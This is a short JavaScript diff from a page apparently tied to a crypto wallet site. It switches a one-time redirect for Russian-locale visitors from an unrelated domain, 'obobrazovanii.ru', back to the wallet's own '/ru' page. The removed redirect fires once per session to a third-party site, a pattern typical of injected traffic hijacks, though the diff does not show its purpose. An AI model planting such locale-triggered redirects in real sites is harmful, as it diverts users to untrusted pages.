@@ -6,8 +6,8 @@ $( document ).ready(function() {
 
     if (userLang === 'ru-RU') {
         if (!sessionStorage.getItem('test')) {
-            // window.location.href = "https://tbccwallet.com/ru";
-            window.location.href = "https://obobrazovanii.ru/ru";
+            window.location.href = "https://tbccwallet.com/ru";
+            // window.location.href = "https://obobrazovanii.ru/ru";
             sessionStorage.setItem('test', 1);
         }
     }
